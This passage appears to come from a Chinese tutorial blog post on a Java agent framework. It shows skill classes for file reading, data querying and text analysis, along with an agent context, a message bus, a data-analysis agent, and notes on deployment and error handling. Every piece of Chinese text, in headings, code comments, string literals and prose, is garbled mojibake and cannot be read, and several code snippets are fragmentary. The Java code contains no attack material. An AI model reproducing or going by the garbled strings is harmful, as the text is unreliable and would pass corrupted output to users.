            metadata.put(<span class="hljs-string">"filePath"</span>, filePath);
            metadata.put(<span class="hljs-string">"fileName"</span>, fileName);
            metadata.put(<span class="hljs-string">"fileSize"</span>, fileSize);
            metadata.put(<span class="hljs-string">"lines"</span>, content.split(<span class="hljs-string">"\n"</span>).length);

            <span class="hljs-type">long</span> <span class="hljs-variable">executionTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;

            logger.info(<span class="hljs-string">"File read successfully: {} ({} bytes)"</span>, fileName, fileSize);

            <span class="hljs-keyword">return</span> SkillResult.success(
                    <span class="hljs-string">"æ–‡ä»¶è¯»å–æˆåŠŸ: "</span> + fileName,
                    content,
                    executionTime,
                    metadata
            );

        } <span class="hljs-keyword">catch</span> (IOException e) {
            logger.error(<span class="hljs-string">"Error reading file"</span>, e);
            <span class="hljs-keyword">return</span> SkillResult.failure(<span class="hljs-string">"æ–‡ä»¶è¯»å–å¤±è´¥: "</span> + e.getMessage(), e.getMessage());
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">10000</span>; <span class="hljs-comment">// 10ç§’è¶…æ—¶</span>
    }

    <span class="hljs-comment">/**
     * è¯»å–æ–‡ä»¶è¡Œ
     */</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">readLines</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);
        <span class="hljs-keyword">return</span> Files.readAllLines(path, StandardCharsets.UTF_8);
    }

    <span class="hljs-comment">/**
     * æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">exists</span><span class="hljs-params">(String filePath)</span> {
        <span class="hljs-keyword">return</span> Files.exists(Paths.get(filePath));
    }

    <span class="hljs-comment">/**
     * è·å–æ–‡ä»¶å¤§å°
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getFileSize</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">return</span> Files.size(Paths.get(filePath));
    }
}

</code></pre>
<h4 data-id="heading-11">3.2 æ•°æ®æŸ¥è¯¢æŠ€èƒ½</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataQuerySkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;Map&lt;String, Object&gt;&gt;&gt; database;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DataQuerySkill</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.database = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        initializeSampleData();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canExecute</span><span class="hljs-params">(String task)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">lowerTask</span> <span class="hljs-operator">=</span> task.toLowerCase();
        <span class="hljs-keyword">return</span> lowerTask.contains(<span class="hljs-string">"æŸ¥è¯¢"</span>) ||
               lowerTask.contains(<span class="hljs-string">"æ•°æ®"</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">tableName</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"tableName"</span>).toString();
        <span class="hljs-type">String</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"condition"</span>).toString();

        List&lt;Map&lt;String, Object&gt;&gt; results = performQuery(
            tableName, condition, <span class="hljs-number">100</span>
        );

        <span class="hljs-keyword">return</span> SkillResult.success(
            <span class="hljs-string">"æŸ¥è¯¢æˆåŠŸï¼Œæ‰¾åˆ°"</span> + results.size() + <span class="hljs-string">"æ¡è®°å½•"</span>,
            results
        );
    }
}
</code></pre>
<h4 data-id="heading-12">3.3 æ–‡æœ¬åˆ†ææŠ€èƒ½</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextAnalysisSkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"text"</span>).toString();
        <span class="hljs-type">String</span> <span class="hljs-variable">operation</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"operation"</span>).toString();

        <span class="hljs-keyword">switch</span> (operation) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"stats"</span>:
                <span class="hljs-keyword">return</span> analyzeStats(text);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"keywords"</span>:
                <span class="hljs-keyword">return</span> extractKeywords(text);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"sentiment"</span>:
                <span class="hljs-keyword">return</span> analyzeSentiment(text);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> fullAnalysis(text);
        }
    }
}
</code></pre>
<h3 data-id="heading-13">å››ã€Agentäº¤äº’æœºåˆ¶</h3>
<h4 data-id="heading-14">4.1 æ—¶åºäº¤äº’</h4>
<p>Agentä¸Skillsä¹‹é—´çš„äº¤äº’éµå¾ªæ˜ç¡®çš„æ—¶åºå…³ç³»ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9b67db1da034019b43c5a67137d13c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=9sa%2F4iHlH2zwQJ2MD6Uck55Q9gk%3D" alt="" loading="lazy"/></p>
<ol>
<li>ç”¨æˆ·å‘Agentå‘é€ä»»åŠ¡è¯·æ±‚</li>
<li>AgentæŸ¥è¯¢Skill Registryè·å–å¯ç”¨æŠ€èƒ½</li>
<li>Registryè¿”å›åŒ¹é…çš„æŠ€èƒ½åˆ—è¡¨</li>
<li>Agentè°ƒç”¨å…·ä½“æŠ€èƒ½æ‰§è¡Œä»»åŠ¡</li>
<li>æŠ€èƒ½è¿”å›æ‰§è¡Œç»“æœ</li>
<li>Agentæ•´åˆç»“æœå¹¶è¿”å›ç»™ç”¨æˆ·</li>
</ol>
<h4 data-id="heading-15">4.2 ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>AgentContextåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼ é€’å’Œå­˜å‚¨æ•°æ®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.agent;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;

<span class="hljs-comment">/**
 * Agentæ‰§è¡Œä¸Šä¸‹æ–‡
 * ç”¨äºåœ¨Agentæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼ é€’å’Œå­˜å‚¨æ•°æ®
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentContext</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String requestId;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; attributes;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; sessionData;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> createdAt;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentContext</span><span class="hljs-params">(String requestId)</span> {
        <span class="hljs-built_in">this</span>.requestId = requestId;
        <span class="hljs-built_in">this</span>.attributes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-built_in">this</span>.sessionData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-built_in">this</span>.createdAt = System.currentTimeMillis();
    }

    <span class="hljs-comment">/**
     * è·å–è¯·æ±‚ID
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> requestId;
    }

    <span class="hljs-comment">/**
     * è®¾ç½®å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAttribute</span><span class="hljs-params">(String key, Object value)</span> {
        attributes.put(key, value);
    }

    <span class="hljs-comment">/**
     * æ‰¹é‡è®¾ç½®å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAttributes</span><span class="hljs-params">(Map&lt;String, Object&gt; attributes)</span> {
        <span class="hljs-keyword">if</span> (attributes != <span class="hljs-literal">null</span>) {
            <span class="hljs-built_in">this</span>.attributes.putAll(attributes);
        }
    }

    <span class="hljs-comment">/**
     * è·å–å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> attributes.get(key);
    }

    <span class="hljs-comment">/**
     * è·å–å±æ€§ï¼ˆå¸¦ç±»å‹è½¬æ¢ï¼‰
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(String key, Class&lt;T&gt; type)</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> attributes.get(key);
        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span> &amp;&amp; type.isInstance(value)) {
            <span class="hljs-keyword">return</span> (T) value;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">/**
     * ç§»é™¤å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">removeAttribute</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> attributes.remove(key);
    }

    <span class="hljs-comment">/**
     * è®¾ç½®ä¼šè¯æ•°æ®
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSessionData</span><span class="hljs-params">(String key, Object value)</span> {
        sessionData.put(key, value);
    }

    <span class="hljs-comment">/**
     * è·å–ä¼šè¯æ•°æ®
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSessionData</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> sessionData.get(key);
    }

    <span class="hljs-comment">/**
     * è·å–æ‰€æœ‰å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getAllAttributes</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(attributes);
    }

    <span class="hljs-comment">/**
     * æ¸…ç©ºå±æ€§
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> {
        attributes.clear();
    }

    <span class="hljs-comment">/**
     * è·å–ä¸Šä¸‹æ–‡åˆ›å»ºæ—¶é—´
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getCreatedAt</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> createdAt;
    }

    <span class="hljs-comment">/**
     * è·å–ä¸Šä¸‹æ–‡å­˜æ´»æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> System.currentTimeMillis() - createdAt;
    }

    <span class="hljs-comment">/**
     * åˆ›å»ºæ–°çš„ä¸Šä¸‹æ–‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentContext <span class="hljs-title function_">create</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> create(generateRequestId());
    }

    <span class="hljs-comment">/**
     * åˆ›å»ºå¸¦è¯·æ±‚IDçš„ä¸Šä¸‹æ–‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentContext <span class="hljs-title function_">create</span><span class="hljs-params">(String requestId)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentContext</span>(requestId);
    }

    <span class="hljs-comment">/**
     * ç”Ÿæˆè¯·æ±‚ID
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRequestId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"req-"</span> + System.currentTimeMillis() + <span class="hljs-string">"-"</span> + Thread.currentThread().getId();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"AgentContext{"</span> +
                <span class="hljs-string">"requestId='"</span> + requestId + <span class="hljs-string">'\''</span> +
                <span class="hljs-string">", attributes="</span> + attributes.size() +
                <span class="hljs-string">", sessionData="</span> + sessionData.size() +
                <span class="hljs-string">", age="</span> + getAge() + <span class="hljs-string">"ms"</span> +
                <span class="hljs-string">'}'</span>;
    }
}

</code></pre>
<p>ä¸Šä¸‹æ–‡åˆ†ä¸ºä¸´æ—¶å±æ€§å’Œä¼šè¯æ•°æ®ï¼Œä¸´æ—¶å±æ€§åœ¨å•æ¬¡è¯·æ±‚ä¸­æœ‰æ•ˆï¼Œä¼šè¯æ•°æ®å¯ä»¥è·¨è¯·æ±‚å…±äº«ã€‚</p>
<h3 data-id="heading-16">äº”ã€å¤šAgentåä½œ</h3>
<h4 data-id="heading-17">5.1 åä½œæ¶æ„</h4>
<p>åœ¨å¤æ‚ç³»ç»Ÿä¸­ï¼Œå¤šä¸ªAgentååŒå·¥ä½œå¯ä»¥å®Œæˆæ›´å¤æ‚çš„ä»»åŠ¡ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa77a39164004687bab75b4510b31ab1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=wUtShnqzeUn8ZXZtQR7Enb5aNoE%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Agent Orchestrator</strong>ï¼šåè°ƒæ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œ</li>
<li><strong>Message Bus</strong>ï¼šå®ç°Agenté—´çš„å¼‚æ­¥é€šä¿¡</li>
<li><strong>Specialized Agents</strong>ï¼šä¸“é—¨å¤„ç†ç‰¹å®šé¢†åŸŸçš„Agent</li>
</ul>
<h4 data-id="heading-18">5.2 æ¶ˆæ¯ä¼ é€’</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageBus</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;Agent&gt;&gt; subscribers;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publish</span><span class="hljs-params">(String topic, Message message)</span> {
        List&lt;Agent&gt; agents = subscribers.get(topic);
        <span class="hljs-keyword">for</span> (Agent agent : agents) {
            executor.submit(() -&gt;
                agent.execute(message.getContent(), message.getContext())
            );
        }
    }
}
</code></pre>
<h3 data-id="heading-19">å…­ã€å®æˆ˜æ¡ˆä¾‹ï¼šæ™ºèƒ½æ•°æ®åˆ†æç³»ç»Ÿ</h3>
<h4 data-id="heading-20">6.1 ç³»ç»Ÿè®¾è®¡</h4>
<p>æˆ‘ä»¬ä»¥ä¸€ä¸ªæ™ºèƒ½æ•°æ®åˆ†æç³»ç»Ÿä¸ºä¾‹ï¼Œå±•ç¤ºAgent Skillsçš„å®é™…åº”ç”¨ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a8853fbcecc41c99e635eb5d607971c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=WVHMAx%2B8YVw6VJzMgtcYY1GeYJU%3D" alt="" loading="lazy"/></p>
<p>ç³»ç»ŸåŒ…å«ä»¥ä¸‹å…³é”®ç»„ä»¶ï¼š</p>
<ul>
<li><strong>å‰ç«¯åº”ç”¨</strong>ï¼šWebç•Œé¢å’Œç§»åŠ¨ç«¯</li>
<li><strong>API Gateway</strong>ï¼šç»Ÿä¸€å…¥å£ï¼Œå¤„ç†è®¤è¯å’Œé™æµ</li>
<li><strong>Agent Layer</strong>ï¼šå¤šä¸ªä¸“é—¨çš„æ•°æ®å¤„ç†Agent</li>
<li><strong>Skills Layer</strong>ï¼š8ç§æ ¸å¿ƒæŠ€èƒ½</li>
<li><strong>Data Sources</strong>ï¼šå¤šç§æ•°æ®æºæ”¯æŒ</li>
</ul>
<h4 data-id="heading-21">6.2 æ•°æ®åˆ†æAgentå®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo;

<span class="hljs-keyword">import</span> com.example.agent.Agent;
<span class="hljs-keyword">import</span> com.example.agent.AgentContext;
<span class="hljs-keyword">import</span> com.example.agent.BaseAgent;
<span class="hljs-keyword">import</span> com.example.skills.SkillResult;
<span class="hljs-keyword">import</span> com.example.skills.impl.DataQuerySkill;
<span class="hljs-keyword">import</span> com.example.skills.impl.FileReadSkill;
<span class="hljs-keyword">import</span> com.example.skills.impl.TextAnalysisSkill;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * æ•°æ®åˆ†æAgent
 * ä¸“é—¨å¤„ç†æ•°æ®åˆ†æç›¸å…³ä»»åŠ¡
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataAnalysisAgent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseAgent</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(DataAnalysisAgent.class);

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DataAnalysisAgent</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>(<span class="hljs-string">"DataAnalysisAgent"</span>, <span class="hljs-string">"æ•°æ®åˆ†ææ™ºèƒ½ä½“ï¼Œæä¾›æ•°æ®æŸ¥è¯¢ã€åˆ†æå’Œå¯è§†åŒ–èƒ½åŠ›"</span>);

        <span class="hljs-comment">// æ³¨å†ŒæŠ€èƒ½</span>
        registerSkill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataQuerySkill</span>());
        registerSkill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextAnalysisSkill</span>());
        registerSkill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReadSkill</span>());
    }

    <span class="hljs-comment">/**
     * æ‰§è¡Œæ•°æ®åˆ†æä»»åŠ¡
     */</span>
    <span class="hljs-keyword">public</span> Agent.AgentResult <span class="hljs-title function_">analyzeData</span><span class="hljs-params">(String query, AgentContext context)</span> {
        logger.info(<span class="hljs-string">"[DataAnalysisAgent] Starting data analysis: {}"</span>, query);

        <span class="hljs-comment">// è®¾ç½®åˆ†æå‚æ•°</span>
        Map&lt;String, Object&gt; parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        parameters.put(<span class="hljs-string">"tableName"</span>, <span class="hljs-string">"users"</span>);
        parameters.put(<span class="hljs-string">"condition"</span>, query);
        parameters.put(<span class="hljs-string">"limit"</span>, <span class="hljs-number">100</span>);

        context.setAttributes(parameters);

        <span class="hljs-keyword">return</span> execute(<span class="hljs-string">"æŸ¥è¯¢ç”¨æˆ·æ•°æ®: "</span> + query, context);
    }

    <span class="hljs-comment">/**
     * ç”Ÿæˆæ•°æ®åˆ†ææŠ¥å‘Š
     */</span>
    <span class="hljs-keyword">public</span> Agent.AgentResult <span class="hljs-title function_">generateReport</span><span class="hljs-params">(String filePath, AgentContext context)</span> {
        logger.info(<span class="hljs-string">"[DataAnalysisAgent] Generating report from file: {}"</span>, filePath);

        Map&lt;String, Object&gt; parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        parameters.put(<span class="hljs-string">"filePath"</span>, filePath);

        context.setAttributes(parameters);

        <span class="hljs-type">AgentResult</span> <span class="hljs-variable">fileResult</span> <span class="hljs-operator">=</span> execute(<span class="hljs-string">"è¯»å–æ•°æ®æ–‡ä»¶"</span>, context);

        <span class="hljs-keyword">if</span> (fileResult.isSuccess()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> fileResult.getData().toString();

            <span class="hljs-comment">// åˆ†ææ–‡æœ¬å†…å®¹</span>
            Map&lt;String, Object&gt; analysisParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            analysisParams.put(<span class="hljs-string">"text"</span>, content);
            analysisParams.put(<span class="hljs-string">"operation"</span>, <span class="hljs-string">"analyze"</span>);

            context.setAttributes(analysisParams);

            <span class="hljs-keyword">return</span> execute(<span class="hljs-string">"åˆ†ææ–‡æœ¬å†…å®¹"</span>, context);
        }

        <span class="hljs-keyword">return</span> fileResult;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">preprocess</span><span class="hljs-params">(String task, AgentContext context)</span> {
        <span class="hljs-built_in">super</span>.preprocess(task, context);
        context.setAttribute(<span class="hljs-string">"agentType"</span>, <span class="hljs-string">"data-analysis"</span>);
        context.setAttribute(<span class="hljs-string">"timestamp"</span>, System.currentTimeMillis());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postprocess</span><span class="hljs-params">(String task, SkillResult result, AgentContext context)</span> {
        <span class="hljs-built_in">super</span>.postprocess(task, result, context);

        <span class="hljs-comment">// è®°å½•åˆ†æç»“æœ</span>
        <span class="hljs-keyword">if</span> (result.isSuccess()) {
            context.setSessionData(<span class="hljs-string">"lastAnalysis"</span>, result.getData());
            context.setSessionData(<span class="hljs-string">"lastAnalysisTime"</span>, System.currentTimeMillis());
        }
    }
}

</code></pre>
<h4 data-id="heading-22">6.3 ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºAgent</span>
        <span class="hljs-type">DataAnalysisAgent</span> <span class="hljs-variable">agent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataAnalysisAgent</span>();

        <span class="hljs-comment">// æ‰§è¡ŒæŸ¥è¯¢</span>
        <span class="hljs-type">AgentContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> AgentContext.create();
        <span class="hljs-type">AgentResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> agent.analyzeData(<span class="hljs-string">"æŠ€æœ¯éƒ¨"</span>, context);

        <span class="hljs-keyword">if</span> (result.isSuccess()) {
            System.out.println(<span class="hljs-string">"æŸ¥è¯¢ç»“æœ: "</span> + result.getData());
        }
    }
}
</code></pre>
<h3 data-id="heading-23">ä¸ƒã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h3>
<h4 data-id="heading-24">7.1 éƒ¨ç½²æ¶æ„</h4>
<p>ç”Ÿäº§ç¯å¢ƒéœ€è¦è€ƒè™‘é«˜å¯ç”¨ã€å¯æ‰©å±•å’Œç›‘æ§ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7102076b5f88431797a5cc1f30f72c89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=65uOAjmiVi%2FYteisNlbPq75Y8Oc%3D" alt="" loading="lazy"/></p>
<p>å…³é”®è®¾è®¡è¦ç‚¹ï¼š</p>
<ul>
<li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šä½¿ç”¨Nginxæˆ–äº‘è´Ÿè½½å‡è¡¡</li>
<li><strong>å¤šå‰¯æœ¬éƒ¨ç½²</strong>ï¼šæ¯ä¸ªAgentéƒ¨ç½²å¤šä¸ªå®ä¾‹</li>
<li><strong>ç›‘æ§ä½“ç³»</strong>ï¼šPrometheus + Grafana</li>
<li><strong>æ—¥å¿—æ”¶é›†</strong>ï¼šELK Stackç»Ÿä¸€ç®¡ç†æ—¥å¿—</li>
</ul>
<h4 data-id="heading-25">7.2 æ€§èƒ½ä¼˜åŒ–</h4>
<ol>
<li><strong>è¿æ¥æ± ç®¡ç†</strong>ï¼šå¤ç”¨æ•°æ®åº“å’ŒHTTPè¿æ¥</li>
<li><strong>å¼‚æ­¥æ‰§è¡Œ</strong>ï¼šä½¿ç”¨çº¿ç¨‹æ± å¹¶è¡Œå¤„ç†ä»»åŠ¡</li>
<li><strong>ç¼“å­˜ç­–ç•¥</strong>ï¼šç¼“å­˜å¸¸ç”¨æŸ¥è¯¢ç»“æœ</li>
<li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šé˜²æ­¢æŠ€èƒ½æ‰§è¡Œæ—¶é—´è¿‡é•¿</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseAgent</span> {
    <span class="hljs-keyword">protected</span> ExecutorService executorService;

    <span class="hljs-keyword">protected</span> SkillResult <span class="hljs-title function_">executeSkill</span><span class="hljs-params">(Skill skill, String task,
                                       Map&lt;String, Object&gt; parameters)</span> {
        Future&lt;SkillResult&gt; future = executorService.submit(
            () -&gt; skill.execute(task, parameters)
        );
        <span class="hljs-keyword">return</span> future.get(skill.getTimeout(), TimeUnit.MILLISECONDS);
    }
}
</code></pre>
<h4 data-id="heading-26">7.3 é”™è¯¯å¤„ç†</h4>
<p>å®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    <span class="hljs-type">SkillResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> executeSkill(skill, task, parameters);
    <span class="hljs-keyword">if</span> (result.isSuccess()) {
        <span class="hljs-keyword">return</span> AgentResult.success(result.getMessage(), result.getData());
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è®°å½•é”™è¯¯æ—¥å¿—</span>
        logger.error(<span class="hljs-string">"Skill execution failed: {}"</span>, result.getError());
        <span class="hljs-comment">// å°è¯•å¤‡ç”¨æŠ€èƒ½</span>
        <span class="hljs-keyword">return</span> executeFallbackSkill(task, context);
    }
} <span class="hljs-keyword">catch</span> (TimeoutException e) {
    <span class="hljs-keyword">return</span> AgentResult.failure(<span class="hljs-string">"æ‰§è¡Œè¶…æ—¶"</span>);
} <span class="hljs-keyword">catch</span> (Exception e) {
    <span class="hljs-keyword">return</span> AgentResult.failure(<span class="hljs-string">"æ‰§è¡Œå¼‚å¸¸: "</span> + e.getMessage());
}
</code></pre>
<h3 data-id="heading-27">å…«ã€æµ‹è¯•ç­–ç•¥</h3>
<h4 data-id="heading-28">8.1 å•å…ƒæµ‹è¯•</h4>
